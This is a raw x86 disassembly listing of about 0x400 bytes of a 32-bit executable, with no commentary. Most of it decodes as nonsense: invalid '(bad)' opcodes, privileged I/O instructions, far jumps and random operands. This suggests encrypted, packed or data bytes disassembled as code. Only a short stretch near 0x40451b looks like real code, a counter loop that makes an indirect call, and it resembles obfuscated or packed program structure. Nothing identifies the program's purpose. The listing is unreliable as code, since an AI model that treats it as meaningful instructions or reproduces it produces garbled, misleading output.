  403fa8:	inc    ecx
  403fa9:	aaa    
  403faa:	xchg   ebx,eax
  403fab:	call   0x63f8064d
  403fb0:	adc    esp,DWORD PTR [ebx+0x1e]
  403fb3:	je     0x403f79
  403fb5:	cli    
  403fb6:	ins    BYTE PTR es:[edi],dx
  403fb7:	js     0x403fd5
  403fb9:	pop    ebp
  403fba:	std    
  403fbb:	xchg   ebx,eax
  403fbc:	mov    edx,0x976f187b
  403fc1:	mov    DWORD PTR [edx],edx
  403fc3:	push   es
  403fc4:	cld    
  403fc5:	inc    eax
  403fc6:	sub    eax,0x57ea5103
  403fcb:	mov    BYTE PTR [esi-0x67bd0011],bl
  403fd1:	cmp    al,0x77
  403fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd4:	mov    bh,0xc5
  403fd6:	xlat   BYTE PTR ds:[ebx]
  403fd7:	arpl   WORD PTR ds:0x6f557dd1,bp
  403fdd:	adc    bh,BYTE PTR [ebx+0x49cc10ee]
  403fe3:	scas   eax,DWORD PTR es:[edi]
  403fe4:	sub    al,BYTE PTR ds:0x4a54bcd6
  403fea:	ins    BYTE PTR es:[edi],dx
  403feb:	sti    
  403fec:	sbb    al,0xcb
  403fee:	pop    es
  403fef:	mov    eax,DWORD PTR [ebp-0x3c]
  403ff2:	adc    DWORD PTR ds:0x42a37d,ecx
  403ff8:	xor    eax,esi
  403ffa:	mov    ecx,DWORD PTR ds:0x42a35d
  404000:	mov    ebx,DWORD PTR ds:0x42a419
  404006:	sub    ecx,ebx
  404008:	or     ecx,DWORD PTR [ecx+ebx*1]
  40400b:	jmp    0x404516
  404010:	xlat   BYTE PTR ds:[ebx]
  404011:	ror    cl,1
  404013:	aas    
  404014:	leave  
  404015:	rcr    ecx,1
  404017:	rol    BYTE PTR [ecx],1
  404019:	xchg   DWORD PTR ds:0xbe1dcc3e,edi
  40401f:	sbb    edx,0x24
  404022:	js     0x40409c
  404024:	push   0x7c
  404026:	js     0x4040a0
  404028:	je     0x40402a
  40402a:	inc    esi
  40402b:	push   edi
  40402c:	jle    0x403fe8
  40402e:	test   BYTE PTR [eax+0xe],ch
  404031:	in     al,0x40
  404033:	js     0x403ffc
  404035:	xchg   esi,eax
  404036:	retf   
  404037:	push   esi
  404038:	add    ch,BYTE PTR [edx+0x44]
  40403b:	xor    dh,BYTE PTR [esi-0x787aec2d]
  404041:	mov    ebx,0x94c40a56
  404046:	cmp    bh,BYTE PTR [esi-0x52]
  404049:	xor    esi,DWORD PTR [edi+0x34]
  40404c:	add    DWORD PTR [ecx-0x39ff5693],ebp
  404052:	pop    ds
  404053:	add    DWORD PTR [edx*1+0x6117e33d],ebx
  40405a:	sbb    eax,0x570bb9f9
  40405f:	mov    esi,?
  404061:	adc    eax,0xd459eaa0
  404066:	stc    
  404067:	in     eax,dx
  404068:	pop    ss
  404069:	(bad)  
  40406b:	fs out dx,eax
  40406d:	div    BYTE PTR [esi+0x2f]
  404070:	inc    edx
  404071:	pop    ss
  404072:	scas   al,BYTE PTR es:[edi]
  404073:	pusha  
  404074:	fs mov dh,0x0
  404077:	jecxz  0x404076
  404079:	mov    esi,0x55ed1e5e
  40407e:	jb     0x4040d8
  404080:	pop    esi
  404081:	mov    WORD PTR [edi-0x52],?
  404084:	aam    0xfe
  404086:	xchg   edi,eax
  404087:	add    al,0xf7
  404089:	stc    
  40408a:	sbb    dl,BYTE PTR [esi+0x7c]
  40408d:	in     eax,0x29
  40408f:	std    
  404090:	jmp    0xab37:0x6564499f
  404097:	mov    al,ds:0x6e19a770
  40409c:	int3   
  40409d:	fstp   DWORD PTR [esi+0x21]
  4040a0:	push   ebx
  4040a1:	aaa    
  4040a2:	in     eax,0x2d
  4040a4:	test   BYTE PTR [eax+0x7f],cl
  4040a7:	in     eax,dx
  4040a8:	out    dx,al
  4040a9:	jg     0x404112
  4040ab:	sti    
  4040ac:	hlt    
  4040ad:	xchg   ecx,eax
  4040ae:	push   cs
  4040af:	xchg   esi,eax
  4040b0:	rol    bl,0x44
  4040b3:	adc    BYTE PTR [edi+ebx*8],dh
  4040b6:	mov    dh,0xc8
  4040b8:	jmp    DWORD PTR [eax]
  4040ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040bb:	pop    ecx
  4040bc:	sti    
  4040bd:	xchg   eax,edi
  4040bf:	cmc    
  4040c0:	mov    eax,0xc8d3d54f
  4040c5:	push   esi
  4040c6:	adc    BYTE PTR [ebx],0x83
  4040c9:	scas   al,BYTE PTR es:[edi]
  4040ca:	pop    ss
  4040cb:	mov    dl,0x5c
  4040cd:	cmp    eax,0x1dd74205
  4040d2:	retf   
  4040d3:	jne    0x4040f4
  4040d5:	lock out dx,eax
  4040d7:	popa   
  4040d8:	in     al,0x3b
  4040da:	ss jae 0x40415b
  4040dd:	in     eax,0xb
  4040df:	xchg   esi,eax
  4040e0:	xchg   edx,eax
  4040e1:	sar    BYTE PTR [edx+0x1d923cd8],0xd7
  4040e8:	add    BYTE PTR [esi],bl
  4040ea:	cmp    ebx,edi
  4040ec:	add    eax,0x9cc12410
  4040f1:	mov    ah,0xbe
  4040f3:	fldcw  WORD PTR [eax]
  4040f5:	push   edi
  4040f6:	shl    DWORD PTR [esi-0xa],0xac
  4040fa:	(bad)  
  4040fc:	fwait
  4040fd:	inc    esi
  4040fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ff:	and    al,0xe1
  404101:	push   eax
  404102:	adc    al,0x53
  404104:	enter  0xf69,0xc7
  404108:	cli    
  404109:	aaa    
  40410a:	jo     0x404146
  40410c:	and    BYTE PTR [esi],ch
  40410e:	outs   dx,BYTE PTR ds:[esi]
  40410f:	fs jmp 0xeb9422fd
  404115:	jnp    0x40415b
  404117:	into   
  404118:	mov    edi,0xeaaeb9ad
  40411d:	dec    ecx
  40411e:	mov    esi,0xdf9c2e62
  404123:	cmp    DWORD PTR [eax],ecx
  404125:	cmc    
  404126:	push   ss
  404127:	popa   
  404128:	inc    edx
  404129:	(bad)  
  40412b:	fsubr  DWORD PTR [ecx+eax*1-0x64]
  40412f:	dec    esp
  404130:	loopne 0x404167
  404132:	jg     0x40415a
  404134:	imul   DWORD PTR [edx-0x625869]
  40413a:	mov    BYTE PTR ds:0x39254bd7,dh
  404140:	ret    0x50e6
  404143:	das    
  404144:	inc    edi
  404145:	psubsb mm6,QWORD PTR [ecx+0xda1ce0e]
  40414c:	xchg   ecx,eax
  40414d:	js     0x4041c3
  40414f:	dec    ecx
  404150:	(bad)  
  404151:	xor    esp,DWORD PTR [ebx]
  404153:	imul   esi,esi,0xc593857
  404159:	sub    DWORD PTR [ecx-0x53d66b7e],0x32c3581e
  404163:	hlt    
  404164:	fstp   st(0)
  404166:	stos   BYTE PTR es:[edi],al
  404167:	imul   edx,esi,0x5a
  40416a:	mov    WORD PTR [esi+0x1f],fs
  40416d:	push   esi
  40416e:	hlt    
  40416f:	dec    ecx
  404170:	mov    eax,ds:0xd0b2a4e5
  404175:	stos   BYTE PTR es:[edi],al
  404176:	xchg   edx,eax
  404177:	es jmp 0x453a9b42
  40417d:	(bad)  
  40417e:	push   esp
  40417f:	stc    
  404180:	push   ebp
  404181:	and    al,0x64
  404183:	out    0xea,al
  404185:	mov    ch,BYTE PTR [eax+0x33fb40bc]
  40418b:	mov    eax,ds:0x830e2ed9
  404190:	rol    BYTE PTR [ebx],1
  404192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404193:	fwait
  404194:	push   0x43
  404196:	mov    esp,0x523cb8cd
  40419b:	mov    dh,0x18
  40419d:	pop    edi
  40419e:	es nop
  4041a0:	sub    DWORD PTR [ebp-0x3a],esi
  4041a3:	and    al,0x1e
  4041a5:	xchg   BYTE PTR [eax-0x31a4989f],cl
  4041ab:	add    eax,0xf4275227
  4041b0:	stos   BYTE PTR es:[edi],al
  4041b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041b2:	jo     0x404223
  4041b4:	(bad)  
  4041b5:	daa    
  4041b6:	in     eax,0x3d
  4041b8:	push   edi
  4041b9:	ins    DWORD PTR es:[edi],dx
  4041ba:	mov    es,WORD PTR [edx]
  4041bc:	inc    ecx
  4041bd:	iret   
  4041be:	fs in  eax,dx
  4041c0:	dec    esi
  4041c1:	data16 icebp 
  4041c3:	and    dl,BYTE PTR [edx]
  4041c5:	fld    TBYTE PTR [ebx-0x6d04d4e7]
  4041cb:	xchg   esp,eax
  4041cc:	inc    ebx
  4041ce:	dec    ecx
  4041cf:	es xchg esi,eax
  4041d1:	out    0xf2,eax
  4041d3:	pop    eax
  4041d4:	or     al,cl
  4041d6:	sbb    al,0x9c
  4041d8:	into   
  4041d9:	pop    ss
  4041da:	in     al,dx
  4041db:	call   FWORD PTR [edx+0x562c14ec]
  4041e1:	fbld   TBYTE PTR [ebx+0x71]
  4041e4:	lods   al,BYTE PTR ds:[esi]
  4041e5:	add    al,0xf3
  4041e7:	rcr    dl,cl
  4041e9:	push   ds
  4041ea:	lds    eax,FWORD PTR [ebp-0x6c]
  4041ed:	icebp  
  4041ee:	bound  esp,QWORD PTR ds:0x64533706
  4041f4:	fwait
  4041f5:	push   es
  4041f6:	imul   edx,DWORD PTR [esi],0x1f
  4041f9:	daa    
  4041fa:	in     eax,0x4b
  4041fc:	dec    edx
  4041fd:	das    
  4041fe:	loopne 0x40425c
  404200:	ins    BYTE PTR es:[edi],dx
  404201:	outs   dx,BYTE PTR ds:[esi]
  404202:	rcr    DWORD PTR [eax+0x47],cl
  404205:	and    BYTE PTR [edx-0x1c672b53],0x2c
  40420c:	mov    ebp,0xe1f70877
  404211:	push   ebp
  404212:	or     dl,BYTE PTR [ebx-0x18e63e1c]
  404218:	jmp    0x43ef3fa9
  40421d:	add    dl,BYTE PTR [ebx+0x2dca88be]
  404223:	gs pop esp
  404225:	push   ecx
  404226:	out    dx,eax
  404227:	mov    db1,eax
  40422a:	mov    ah,0xf2
  40422c:	int    0x71
  40422e:	xchg   edi,eax
  40422f:	inc    esi
  404230:	sbb    eax,0x712d74e0
  404235:	mov    ebp,0x49702e1a
  40423a:	cs cld 
  40423c:	das    
  40423d:	xor    eax,0x45e0c8d6
  404242:	int3   
  404243:	pop    ebx
  404244:	dec    edi
  404245:	(bad)  
  404247:	inc    edi
  404248:	cmp    al,0x3d
  40424a:	dec    ebx
  40424b:	ins    DWORD PTR es:[edi],dx
  40424c:	sbb    al,0x96
  40424e:	and    BYTE PTR [ecx-0x7215c753],dl
  404254:	mov    dl,BYTE PTR [edx+0x20c8fadf]
  40425a:	jecxz  0x40429f
  40425c:	test   edx,0x1bb072a1
  404262:	sbb    cl,BYTE PTR [ecx]
  404264:	sbb    DWORD PTR [esi-0x7],esp
  404267:	add    eax,0x4c14a89e
  40426c:	adc    bl,BYTE PTR [ebx]
  40426e:	jl     0x404286
  404270:	jl     0x40429e
  404272:	xor    al,0x1
  404274:	cwde   
  404275:	addr16 mov ebp,0x96cb1751
  40427b:	test   al,0x90
  40427d:	test   eax,0x53b29fdd
  404282:	sub    ebp,DWORD PTR [ebp+0x6c]
  404285:	repnz sbb BYTE PTR [ebx],0x46
  404289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40428a:	fdivrp st(1),st
  40428c:	fnsave [ebp+0x495befa6]
  404292:	test   eax,0xff385ba0
  404297:	pop    es
  404298:	imul   edx,DWORD PTR [edi-0x63],0xffffffef
  40429c:	or     BYTE PTR [edx+0x5e61b90b],cl
  4042a2:	sub    BYTE PTR [ecx+0x40d5b6a2],cl
  4042a8:	xchg   ecx,eax
  4042a9:	bound  esi,QWORD PTR [ecx]
  4042ab:	push   cs
  4042ac:	mov    esp,0x81dba1f2
  4042b1:	mov    bl,0xfc
  4042b3:	push   eax
  4042b4:	lea    ebp,[eax-0x3d08c72c]
  4042ba:	pop    ebx
  4042bb:	lods   eax,DWORD PTR ds:[esi]
  4042bc:	imul   DWORD PTR [edx-0x484930a6]
  4042c2:	test   DWORD PTR [esp+eiz*8+0x5d4e915c],esi
  4042c9:	and    BYTE PTR [edx],ah
  4042cb:	imul   edi,DWORD PTR [edi+0x17],0xffffff92
  4042cf:	(bad)  
  4042d1:	ins    DWORD PTR es:[edi],dx
  4042d2:	push   ss
  4042d3:	ins    DWORD PTR es:[edi],dx
  4042d4:	adc    BYTE PTR [edi],ch
  4042d6:	(bad)  
  4042d8:	lahf   
  4042d9:	mov    dl,0xcf
  4042db:	test   al,0xa0
  4042dd:	scas   eax,DWORD PTR es:[edi]
  4042de:	aaa    
  4042df:	js     0x4042a3
  4042e1:	div    ecx
  4042e3:	xchg   esi,eax
  4042e4:	cmp    DWORD PTR [ecx-0x3c80cb25],esi
  4042ea:	scas   al,BYTE PTR es:[edi]
  4042eb:	hlt    
  4042ec:	or     esp,DWORD PTR [eax-0x70d9af9f]
  4042f2:	mov    eax,ds:0x643b472c
  4042f7:	(bad)  
  4042f8:	addr16 (bad) 
  4042fa:	inc    ecx
  4042fb:	xchg   esp,eax
  4042fc:	out    dx,al
  4042fd:	std    
  4042fe:	cmp    al,0x54
  404300:	dec    edx
  404301:	das    
  404302:	inc    edi
  404303:	or     edx,DWORD PTR [bp+di+0x4c64]
  404308:	inc    ebp
  404309:	push   cs
  40430a:	dec    esp
  40430b:	scas   eax,DWORD PTR es:[edi]
  40430c:	es jg  0x404345
  40430f:	data16 jb 0x4042b1
  404312:	lods   al,BYTE PTR ds:[esi]
  404313:	and    eax,0x947fc779
  404318:	push   cs
  404319:	pop    edx
  40431a:	push   esp
  40431b:	pop    esp
  40431c:	pop    ss
  40431d:	pop    esi
  40431e:	ins    BYTE PTR es:[edi],dx
  40431f:	cmp    al,0x25
  404321:	jmp    0x404384
  404323:	jb     0x404367
  404325:	and    ch,BYTE PTR [eax+0x3cd72fb9]
  40432b:	lods   eax,DWORD PTR ds:[esi]
  40432c:	mov    ecx,0x6074d5d2
  404331:	shr    BYTE PTR [edx+eiz*2-0x51],1
  404335:	fcmove st,st(4)
  404337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404338:	cmp    al,0x6
  40433a:	dec    ebp
  40433b:	adc    al,0x8d
  40433d:	or     ch,BYTE PTR [edx-0x5eca8291]
  404343:	cli    
  404344:	test   BYTE PTR [edx-0x6b607bdb],cl
  40434a:	outs   dx,DWORD PTR ds:[esi]
  40434b:	sti    
  40434c:	pop    ss
  40434d:	mov    WORD PTR [ecx+0x4],es
  404350:	ins    DWORD PTR es:[edi],dx
  404351:	sahf   
  404352:	or     BYTE PTR [edi+0x50],bl
  404355:	movhps xmm1,QWORD PTR [ebx+ecx*1+0x2497d9db]
  40435d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40435e:	or     eax,edx
  404360:	and    ah,BYTE PTR [eax+0x60cf1da9]
  404366:	aas    
  404367:	test   al,0xf3
  404369:	pop    es
  40436a:	sbb    dh,0x96
  40436d:	out    dx,eax
  40436e:	and    eax,0xb212293a
  404373:	(bad)  [ecx+0x31]
  404376:	jo     0x404374
  404378:	sub    BYTE PTR [esi+edi*4+0x57],al
  40437c:	dec    ecx
  40437d:	int3   
  40437e:	pop    esi
  40437f:	pop    edx
  404380:	xor    al,BYTE PTR [ecx+0x7]
  404383:	add    DWORD PTR [esi+0x3e6ea768],ebx
  404389:	sbb    al,0xc4
  40438b:	cwde   
  40438c:	add    edx,ebp
  40438e:	scas   al,BYTE PTR es:[edi]
  40438f:	add    eax,0x24d7e3da
  404394:	imul   edx,esp,0x6c
  404397:	jge    0x404383
  404399:	test   BYTE PTR [ecx-0x430696ae],ah
  40439f:	mov    edi,0x4ddb4126
  4043a4:	adc    DWORD PTR [edx+0x35],ebx
  4043a7:	clc    
  4043a8:	push   cs
  4043a9:	das    
  4043aa:	mov    ch,0xcf
  4043ac:	out    dx,al
  4043ad:	adc    cl,BYTE PTR [esi]
  4043af:	sub    eax,0xa10d8967
  4043b4:	pop    esi
  4043b5:	rcr    ah,0xe9
  4043b8:	ret    
  4043b9:	inc    ebp
  4043ba:	push   ss
  4043bb:	ins    BYTE PTR es:[edi],dx
  4043bc:	(bad)  
  4043bd:	push   ds
  4043be:	fwait
  4043bf:	inc    eax
  4043c0:	(bad)  
  4043c1:	cmp    dl,BYTE PTR [ebp-0x4126d512]
  4043c7:	cli    
  4043c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043c9:	popf   
  4043ca:	rcl    BYTE PTR [eax-0x526a712d],cl
  4043d0:	gs and ch,al
  4043d3:	push   0xffffffa3
  4043d5:	mov    edx,0xa0a8f1fa
  4043da:	popf   
  4043db:	xor    DWORD PTR [esi-0x49a0037e],esi
  4043e1:	in     eax,dx
  4043e2:	add    DWORD PTR [eax],esp
  4043e4:	cmp    eax,0x9a2d4327
  4043e9:	imul   edx,edi,0xffffffcf
  4043ec:	mov    esi,DWORD PTR [ebx+0x70eb25aa]
  4043f2:	arpl   WORD PTR [ecx+0x19],cx
  4043f5:	(bad)  
  4043f7:	mov    edi,0xd3039ebf
  4043fc:	jns    0x404464
  4043fe:	xchg   ebx,eax
  4043ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404400:	cmc    
  404401:	shr    cl,cl
  404403:	(bad)  
  404404:	fisttp DWORD PTR [ecx-0x7e6640c6]
  40440a:	test   eax,0xab1d7a7c
  40440f:	sbb    eax,0x5711b32d
  404414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404415:	arpl   sp,bx
  404417:	sub    DWORD PTR [edx-0x32c846c9],eax
  40441d:	inc    esi
  40441e:	not    DWORD PTR [esp+ebx*2]
  404421:	xor    al,0x6c
  404423:	or     eax,DWORD PTR [eax]
  404425:	mov    dl,0x18
  404427:	or     ah,BYTE PTR [ecx]
  404429:	xor    dh,dl
  40442b:	xchg   esi,eax
  40442c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40442f:	cdq    
  404430:	popf   
  404431:	cmp    edx,DWORD PTR [ebp+edi*4-0x55ee552c]
  404438:	mov    ds:0x5d00d191,al
  40443d:	mov    bl,BYTE PTR [ebx-0x4d]
  404440:	jge    0x40441f
  404442:	test   edx,edx
  404444:	test   al,0x1c
  404446:	or     ax,0xa5f8
  40444a:	push   es
  40444b:	and    al,0xf4
  40444d:	into   
  40444e:	or     edx,DWORD PTR [edx-0x29ba4459]
  404454:	lods   eax,DWORD PTR ds:[esi]
  404455:	cwde   
  404456:	inc    esp
  404457:	in     al,0x6d
  404459:	in     eax,dx
  40445a:	xchg   BYTE PTR [edx+esi*4+0x402184b3],cl
  404461:	shl    DWORD PTR [ebp-0x1936e49e],1
  404467:	shr    BYTE PTR [edx+0x64],1
  40446a:	mov    ebx,DWORD PTR [edi+0x4f415fd8]
  404470:	pop    eax
  404471:	call   0xd2ff0adf
  404476:	fidiv  DWORD PTR [ebx]
  404478:	pop    es
  404479:	jge    0x4044ab
  40447b:	sbb    edx,DWORD PTR [edi]
  40447d:	in     al,dx
  40447e:	fld    TBYTE PTR [edi+0x2b]
  404481:	mov    ah,0x9
  404483:	sahf   
  404484:	jno    0x40443b
  404486:	xchg   ebp,eax
  404487:	pop    es
  404488:	push   es
  404489:	mov    ch,0x8f
  40448b:	xor    dl,bh
  40448d:	mov    al,ds:0xa5feb063
  404492:	inc    ecx
  404493:	enter  0xc3c9,0x7a
  404497:	jge    0x40449e
  404499:	adc    eax,0x644c67d1
  40449e:	enter  0x9a75,0x20
  4044a2:	add    ebp,DWORD PTR [edi+0x1c]
  4044a5:	ja     0x40449f
  4044a7:	nop
  4044a8:	inc    ecx
  4044a9:	xchg   esi,eax
  4044aa:	stc    
  4044ab:	push   edi
  4044ac:	xchg   edx,eax
  4044ad:	pop    esp
  4044ae:	push   es
  4044af:	sub    al,0x67
  4044b1:	push   eax
  4044b2:	mov    al,0xcc
  4044b4:	fadd   DWORD PTR [ebx-0x71]
  4044b7:	scas   eax,DWORD PTR es:[edi]
  4044b8:	dec    esp
  4044b9:	jne    0x4044bd
  4044bb:	daa    
  4044bc:	jmp    0x404474
  4044be:	mov    cl,0x15
  4044c0:	pop    edi
  4044c1:	dec    edi
  4044c2:	jecxz  0x40451d
  4044c4:	fadd   DWORD PTR [edx]
  4044c6:	es fwait
  4044c8:	xchg   esp,eax
  4044c9:	inc    edi
  4044ca:	loop   0x4044fd
  4044cc:	pop    esp
  4044cd:	sub    al,0xfa
  4044cf:	push   eax
  4044d0:	push   edi
  4044d1:	(bad)  
  4044d2:	and    eax,0xdd2895fe
  4044d7:	pop    edx
  4044d8:	lea    edx,[edi+0x4165783]
  4044de:	xchg   ebp,eax
  4044df:	push   edi
  4044e0:	lods   eax,DWORD PTR ds:[esi]
  4044e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044e2:	mov    ?,WORD PTR [ebx+0x112a6bf2]
  4044e8:	add    al,0x69
  4044ea:	xchg   esp,eax
  4044eb:	(bad)  [esi]
  4044ed:	xchg   ebp,eax
  4044ee:	pop    ecx
  4044ef:	outs   dx,DWORD PTR ds:[esi]
  4044f0:	cdq    
  4044f1:	ds addr16 xchg ebp,eax
  4044f4:	push   0x7d
  4044f6:	and    BYTE PTR [ecx+0x49],bl
  4044f9:	or     edx,DWORD PTR [esp+esi*4]
  4044fc:	mov    dh,0x57
  4044fe:	xchg   ebp,eax
  4044ff:	push   0xffffffed
  404501:	add    ah,BYTE PTR [esi]
  404503:	fsubr  st(4),st
  404505:	push   0xffffff97
  404507:	rcl    BYTE PTR [esp+eiz*8+0x7f],0x8b
  40450c:	add    dh,dh
  40450e:	test   DWORD PTR [ecx+0x467e42ff],eax
  404514:	push   edi
  404515:	cmp    BYTE PTR [ebx],al
  404517:	(bad)  
  404518:	mov    DWORD PTR [ebp-0x34],eax
  40451b:	mov    eax,DWORD PTR [ebp-0x44]
  40451e:	and    DWORD PTR ds:0x42a3b5,0x0
  404528:	xor    ecx,ecx
  40452a:	add    ecx,DWORD PTR ds:0x42a3b5
  404530:	inc    ecx
  404531:	mov    DWORD PTR ds:0x42a3b5,ecx
  404537:	cmp    DWORD PTR ds:0x42a3b5,0x5
  40453e:	jne    0x40455d
  404544:	push   DWORD PTR [ebp-0x18]
  404547:	push   0x8a8f
  40454c:	push   DWORD PTR [ebp-0x18]
  40454f:	push   0x495a
  404554:	push   DWORD PTR [ebp-0x24]
  404557:	call   DWORD PTR ds:0x42534c
  40455d:	cmp    DWORD PTR ds:0x42a3b5,0x4
  404564:	jne    0x404579
  40456a:	xor    ecx,ecx
  40456c:	add    ecx,DWORD PTR ds:0x42a3b5
  404572:	inc    ecx
  404573:	mov    DWORD PTR ds:0x42a3b5,ecx
  404579:	cmp    DWORD PTR ds:0x42a3b5,0x14
  404580:	jb     0x404528
  404586:	xor    eax,esi
  404588:	jmp    0x404a93
  40458d:	cmp    eax,0xc7cf3fc6
  404592:	aad    0xcd
  404594:	(bad)  
  404595:	dec    esi
  404596:	add    BYTE PTR cs:[ebx-0x2d],ch
  40459a:	enter  0x77d1,0xc4
  40459e:	das    
  40459f:	js     0x404619
  4045a1:	push   0x7c
  4045a3:	js     0x40461d
  4045a5:	imul   ecx,DWORD PTR [ebx+0x3554772e],0xffffffe5
  4045ac:	(bad)  
  4045ad:	push   esp
  4045ae:	(bad)  
  4045af:	ss iret 
  4045b1:	push   esi
  4045b2:	fdivr  st(5),st
  4045b4:	js     0x4045b4
  4045b6:	mov    bh,BYTE PTR ds:0xdda9b63e
  4045bc:	cmc    
  4045bd:	loope  0x4045ba
  4045bf:	xor    BYTE PTR [ebp-0x37],dl
  4045c2:	and    cl,BYTE PTR ds:0xda40b8d3
  4045c8:	(bad)  
  4045c9:	inc    esp
  4045ca:	das    
  4045cb:	jbe    0x4045ff
  4045cd:	or     esi,DWORD PTR [edi-0x495a13eb]
  4045d3:	aaa    
  4045d4:	adc    ch,BYTE PTR ds:0x66e45887
  4045da:	hlt    
  4045db:	cdq    
  4045dc:	dec    edx
  4045dd:	je     0x404594
  4045df:	int3   
  4045e0:	mov    bl,0x21
  4045e2:	call   0x39336839
  4045e7:	test   ecx,edx
  4045e9:	stc    
  4045ea:	add    DWORD PTR [edi-0x7e],ecx
  4045ed:	push   ebp
  4045ee:	push   ds
  4045ef:	ins    DWORD PTR es:[edi],dx
  4045f0:	pop    ss
  4045f1:	xchg   esp,eax
  4045f2:	sub    DWORD PTR [edi+0x58],esi
  4045f5:	jg     0x404596
  4045f7:	jg     0x40457b
  4045f9:	arpl   WORD PTR [esi+0x6bc23e8c],sp
  4045ff:	mov    ch,0x1b
  404601:	inc    ebx
  404602:	jnp    0x404585
  404604:	pop    eax
  404605:	pusha  
  404606:	loope  0x4045e3
  404608:	xor    BYTE PTR ds:0x5f233aba,dh
  40460e:	std    
  40460f:	lock inc eax
  404612:	adc    esp,DWORD PTR [ecx]
  404614:	inc    bh
  404616:	out    0xda,al
  404618:	out    dx,al
  404619:	xor    DWORD PTR [eax+0x2f4841ae],0x9a92d391
  404623:	shl    ecx,cl
  404625:	shl    eax,1
  404627:	jecxz  0x404664
  404629:	retf   
  40462a:	inc    ebp
  40462b:	jns    0x404614
  40462d:	leave  
  40462e:	and    bh,BYTE PTR [eax-0x41]
  404631:	mov    ah,0xc
  404633:	xor    ah,BYTE PTR [ebp-0x17]
  404636:	cmp    BYTE PTR [ecx-0x74593cb9],al
  40463c:	gs add al,0x78
  40463f:	inc    esi
  404640:	push   0x53
  404642:	es dec sp
  404645:	cmp    dh,BYTE PTR [edx]
  404647:	mov    esi,0x810b52e0
  40464c:	inc    esp
  40464d:	dec    ebx
  40464e:	int    0x23
  404650:	jp     0x4045f3
  404652:	and    bl,BYTE PTR [eax+0x3f628110]
  404658:	test   al,0x60
  40465a:	jno    0x404613
  40465c:	mov    esi,0x324f0661
  404661:	(bad)  
  404662:	out    dx,al
  404663:	test   al,0xc2
  404665:	cmp    esp,esi
  404667:	jno    0x4046da
  404669:	scas   eax,DWORD PTR es:[edi]
  40466a:	and    BYTE PTR [esp+edx*1],cl
  40466d:	inc    edx
  40466e:	pop    esi
  40466f:	out    0x6,eax
  404671:	or     cl,ch
  404673:	in     al,dx
  404674:	mov    eax,0xbe64cb55
  404679:	sbb    ebx,DWORD PTR [esi-0x46cd726e]
  40467f:	fst    DWORD PTR [ecx]
  404681:	mov    bh,dh
  404683:	push   ds
  404684:	mov    ch,0x3
  404686:	dec    esp
  404687:	mov    esi,0x66c8d096
  40468c:	mov    edx,0xbb2edee0
  404691:	ret    
  404692:	stc    
  404693:	jb     0x404617
  404695:	pop    edi
  404696:	into   
  404697:	cmp    cl,BYTE PTR [eax+0x43]
  40469a:	dec    esi
  40469b:	out    dx,eax
  40469c:	out    dx,eax
  40469d:	ja     0x40468c
  40469f:	fcomp  QWORD PTR [edx+0x2a]
  4046a2:	sub    DWORD PTR [eax+eiz*4+0x7907d53f],ecx
  4046a9:	aad    0xbb
  4046ab:	mov    bh,0x1d
  4046ad:	sbb    al,0xbc
  4046af:	(bad)  
  4046b0:	xor    bh,BYTE PTR [edi]
  4046b2:	pop    esi
  4046b3:	lock sub BYTE PTR [ecx-0x6d459e08],ch
  4046ba:	(bad)  
  4046bb:	test   BYTE PTR ds:0xf7ce36ac,0xdf
  4046c2:	push   edi
  4046c3:	into   
  4046c4:	je     0x404686
  4046c6:	imul   DWORD PTR [edi-0x466cb7a4]
  4046cc:	(bad)  
  4046cd:	pop    eax
  4046ce:	sub    bh,bl
  4046d0:	and    eax,0x1da03eff
  4046d5:	mov    bh,0xce
  4046d7:	imul   eax,DWORD PTR [edi-0x16b558b7],0x7
  4046de:	shl    DWORD PTR [ebp+ebx*8+0x109c8dfe],1
  4046e5:	dec    edx
  4046e6:	or     bl,BYTE PTR [ebp+0x12dbda43]
  4046ec:	test   DWORD PTR [ebp+0x69],ebx
  4046ef:	add    eax,0xb9e2edfe
  4046f4:	or     eax,DWORD PTR [ebp-0x5a]
  4046f7:	or     eax,0x5af153fe
  4046fc:	push   ecx
  4046fd:	inc    eax
  4046fe:	dec    esi
  4046ff:	hlt    
  404700:	arpl   si,bx
  404702:	dec    ebx
  404703:	aaa    
  404704:	push   esi
  404705:	cmp    BYTE PTR [edx+esi*8],0x38
  404709:	jge    0x404726
  40470b:	shl    DWORD PTR [edi-0x5d],0x7d
  40470f:	xchg   DWORD PTR ds:0x4ca99e6e,ebx
  404715:	jb     0x4046b7
  404717:	sar    esi,cl
  404719:	dec    ebp
  40471a:	cli    
  40471b:	push   0x1f01b28f
  404720:	push   ecx
  404721:	ret    0xced8
  404724:	stos   DWORD PTR es:[edi],eax
  404725:	cmp    al,0x11
  404727:	sbb    BYTE PTR [esp+eax*1-0x1de2f736],ah
  40472e:	sbb    BYTE PTR [ecx],bh
  404730:	inc    esp
  404731:	ds pop ebp
  404733:	mov    esi,0x86eea340
  404738:	leave  
  404739:	nop
  40473a:	pop    ds
  40473b:	dec    ebp
  40473c:	ja     0x4047ac
  40473e:	inc    edx
  40473f:	add    al,0x7e
  404741:	or     dh,BYTE PTR es:[edi]
  404744:	scas   eax,DWORD PTR es:[edi]
  404745:	jmp    0x4047b1
  404747:	dec    esi
  404748:	mov    WORD PTR [esi],?
  40474a:	(bad)  
  40474b:	fild   DWORD PTR [esi+0x7955d585]
  404751:	dec    esi
  404752:	bound  ebx,QWORD PTR [eax-0xb0e0a87]
  404758:	mov    es,ebx
  40475a:	retf   0xae97
  40475d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40475e:	sbb    dh,BYTE PTR [ebx]
  404760:	fstp   DWORD PTR [eax-0x2b]
  404763:	or     edx,DWORD PTR [edx-0x59fc6a6]
  404769:	mov    bh,0xd1
  40476b:	pop    ebp
